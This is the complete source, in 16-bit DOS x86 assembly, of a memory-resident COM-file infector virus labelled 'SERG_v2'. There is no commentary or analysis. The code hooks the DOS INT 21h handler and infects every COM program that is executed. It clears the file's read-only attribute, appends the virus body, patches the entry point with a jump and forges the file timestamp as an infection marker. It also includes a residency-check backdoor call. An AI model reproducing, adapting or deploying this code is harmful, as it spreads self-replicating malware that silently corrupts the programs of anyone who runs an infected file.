        .MODEL tiny
        .186
        .code
        org 100h
start:
        jmp     sc
        db      200d dup(08h)
sc     PROC
	Call	Go
Go:	Pop	Bp
	Sub	Bp,offset Go
	Mov	Ax,0deadh
	Int	21h
	Cmp	Dx,1996h
	Jz	Rt
        Mov     Ax,4900h
        Int     21h
        Jc      rt
        Mov     Ax,4800h
        Mov     Bx,0FFFFh
        Int     21h
        Sub     Bx,mem
        Jc      rt
	Mov	Cx,Es
	Stc
	Adc	Cx,Bx
	Mov     Ax,4a00h
        Int     21h
	Mov	Bx,mem-1
	Stc
	Sbb	word ptr  Es:[0002h],Bx
	Mov	Es,Cx
        Mov     Ax,4a00h
        Int     21h
	Mov	Ax,Es
	Dec	Ax
	Mov	Ds,Ax
	Mov	word ptr Ds:[0001],8
	Push	Cs
	Pop	Ds
	Push	Es
	Mov	Ax,3521h
	Int	21h
	Mov	word ptr Old_21+1,Bx
	Mov	word ptr Old_21+3,Es
	Lea	Si,Sc+[Bp]
	Xor	Di,Di
	Pop	Es
	Mov	Cx,Lng
	Rep	MovSb
	Mov	Ax,2521h
	Mov	Dx,offset res - 103h - 200d
	Push	Es
	Pop	Ds
	Int	21h
	Jmp	Rt

Res:	Pushf
	Push	Ax
	Push	Bx
	Push	Cx
	Push	Dx
	Push	Ds
	Push	Es
	Cmp	Ax,4b00h
	Jnz	Exit
	Mov	Ax,4300h
	Int	21h
	Xor	Ch,Ch
	And	Cx,0fffeh
	Mov	Ax,4301h
	Int	21h
	Mov	Ax,3d02h
	Int	21h
	Jc	Exit
	Xchg	Ax,Bx
	Mov	Ax,4200h
	Call	move
	Push	Cs
	Pop	Ds
	Mov	Ah,3fh
	Mov	Cx,3h
	Mov	Dx,offset Buf_j - 100h - 203d
	Int	21h
	Cmp	word ptr buf_j-100h-203d,'ZM'
	Jz	Close
	Mov	Ax,5700h
	Int	21h
	Mov	word ptr time-100h-203d,Cx
	Mov	word ptr date-100h-203d,Dx
	And	Cx,1ah
	Cmp	Cx,1ah
	Jz	Close
	Mov	Ax,4200h
	Call	move
	Mov	Ax,4202h
 	Call	move
	Cmp	Ax,62000d
	ja	close
	Cmp	Ax,100h
	jb	close
	Sub	Ax,03h
	Mov	word ptr New_j-100h-202d,Ax
	Mov	Ah,40h
	Xor	Dx,Dx
	Mov	Cx,lng
	Int	21h
	Mov	Ax,4200h
	Call	move
	Mov	Ah,40h
	Mov	Dx,offset New_j-100h-203d
	Mov	Cx,3h
	Int	21h
	Mov	Ax,5701h
	Mov	Dx,word ptr cs:date-100h-203d
	Mov	Cx,word ptr cs:time-100h-203d
	And	Cx,0ff0eh
	or	Cx,1ah
	Int	21h
Close:	Mov	Ah,3eh
	Int	21h
Exit:	Pop	Es
	Pop	Ds
	Pop	Dx
	Pop	Cx
	Pop	Bx
	Pop	Ax
	Cmp	Ax,0deadh
	Jz	Ok
	Popf

Old_21:	
	db	0eah
	dw	0000h,0000h
;==============================================================
ok:	Mov	Dx,1996h
	Popf
	Iret

Buf_j	db	0cdh,20h,90h
New_j	db	0e9h,00h,00h
date	dw	?
time	dw	?

move:	Xor	Cx,Cx
	Cwd
	Int	21h
	ret
;==============================================================
rt:
        Push    Cs
        Pop     Ds
	Push	Cs
	Pop	Es
	Lea	Si,Buf_j+[Bp]
	Mov	Di,100h
	MovSw
	MovSb
        Xor     Ax,Ax
        Xor     Cx,Cx
        Cwd
        Mov     Bx,Dx
	Push	100h
        Ret
sc      ENDP
	db	'SERG_v2'
Lng	=	$-Sc
mem	=	(Lng/16d)+2
END start
END
